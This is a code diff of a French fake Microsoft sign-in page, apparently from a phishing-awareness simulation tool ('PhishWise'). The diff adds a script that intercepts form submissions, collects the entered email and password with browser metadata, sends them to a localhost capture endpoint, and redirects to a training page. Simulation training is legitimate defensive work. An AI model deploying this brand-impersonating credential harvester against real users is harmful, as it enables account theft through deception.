@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
+<!DOCTYPE html><html lang="fr"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Se connecter à votre compte</title>
@@ -221,30 +219,20 @@
 <body>
     <div class="login-container">
         <div class="microsoft-logo">
-            <img src="/images/logos/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" alt="Microsoft Office Logo" class="logo-img">
+            <img src="http://localhost:3000/images/logos/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" alt="Microsoft Office Logo" class="logo-img">
         </div>
         
         <h1 class="sign-in-title">Se connecter</h1>
         <p class="sign-in-subtitle">à votre compte</p>
         
-        <form id="loginForm" action="/login" method="POST">
+        <form id="loginForm" action="http://localhost:3000/login" method="POST">
             <div class="input-group">
-                <input type="email" 
-                       class="input-field" 
-                       name="email" 
-                       placeholder="E-mail, téléphone ou nom Skype" 
-                       required
-                       autocomplete="username">
+                <input type="email" class="input-field" name="email" placeholder="E-mail, téléphone ou nom Skype" required="" autocomplete="username">
                 <div class="error-message" id="emailError">Veuillez entrer une adresse e-mail valide.</div>
             </div>
             
             <div class="input-group">
-                <input type="password" 
-                       class="input-field" 
-                       name="password" 
-                       placeholder="Mot de passe" 
-                       required
-                       autocomplete="current-password">
+                <input type="password" class="input-field" name="password" placeholder="Mot de passe" required="" autocomplete="current-password">
                 <div class="error-message" id="passwordError">Mot de passe incorrect. Réessayez.</div>
             </div>
             
@@ -255,8 +243,8 @@
             
             <div class="button-container">
                 <button type="submit" class="sign-in-button" id="loginButton">
-                    <div class="loading-spinner" id="loadingSpinner"></div>
-                    <span class="button-text" id="buttonText">Se connecter</span>
+                    <div class="loading-spinner" id="loadingSpinner" style="display: none;"></div>
+                    <span class="button-text" id="buttonText" style="opacity: 1;">Se connecter</span>
                 </button>
             </div>
             
@@ -331,5 +319,126 @@
             loadingSpinner.style.display = 'none';
         });
     </script>
-</body>
-</html>
+
+
+
+    <script>
+      (function() {
+        // Custom alert function to replace native alert()
+        window.customAlert = function(message) {
+          console.log('Custom Alert:', message);
+          // You can implement a more sophisticated modal/message box here if needed.
+          // For now, it just logs to console.
+          // Example: alert(message); // If you still want the native alert for simulation
+        };
+
+        console.log('🎯 PhishWise Universal Tracking activated');
+
+        // Wait for DOM to be ready
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initTracking);
+        } else {
+          initTracking();
+        }
+
+        function initTracking() {
+          // Intercept all forms
+          const forms = document.querySelectorAll('form');
+          console.log('📝 Forms detected:', forms.length);
+
+          forms.forEach(function(form, index) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+              console.log('📋 Form submission intercepted:', index);
+
+              // Collect all form data
+              const formData = new FormData(form);
+              const data = {};
+
+              // Extract data from inputs
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
+              const inputs = form.querySelectorAll('input, select, textarea');
+              inputs.forEach(function(input) {
+                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
+                  if (input.type === 'checkbox' || input.type === 'radio') {
+                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
+                  } else {
+                    data[input.name] = input.value;
+                  }
+                }
+              });
+
+              // Tracking metadata
+              data._campaignId = '68ae432cc7bddb95f93aeeb7';
+              data._timestamp = new Date().toISOString();
+              data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+              data._formIndex = index;
+              data._formAction = form.action || 'N/A';
+              data._formMethod = form.method || 'GET';
+
+              console.log('📊 Collected data:', data);
+
+              // Send data
+              fetch('http://localhost:3000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+              }).then(function(response) {
+                console.log('✅ Data sent successfully');
+                // Redirect to learning page
+                window.location.href = 'http://localhost:3000/learning/68ae432cc7bddb95f93aeeb7';
+              }).catch(function(error) {
+                console.error('❌ Error sending data:', error);
+                // Redirect even on error
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:3000/learning/68ae432cc7bddb95f93aeeb7';
+                }, 1000);
+              });
+            });
+          });
+
+          // Track link clicks
+          document.addEventListener('click', function(e) {
+            const link = e.target.closest('a');
+            if (link) {
+              const href = link.href;
+              console.log('🔗 Link clicked:', href);
+
+              // Send click event
+              fetch('http://localhost:3000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '68ae432cc7bddb95f93aeeb7',
+                  clickedUrl: href,
+                  linkText: link.textContent.trim(),
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+            }
+          });
+
+          // Track input field interactions (focus)
+          const inputs = document.querySelectorAll('input, textarea, select');
+          inputs.forEach(function(input) {
+            input.addEventListener('focus', function() {
+              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
+            });
+          });
+
+          console.log('🚀 Universal tracking initialized');
+        }
+      })();
+    </script>
+</body></html>
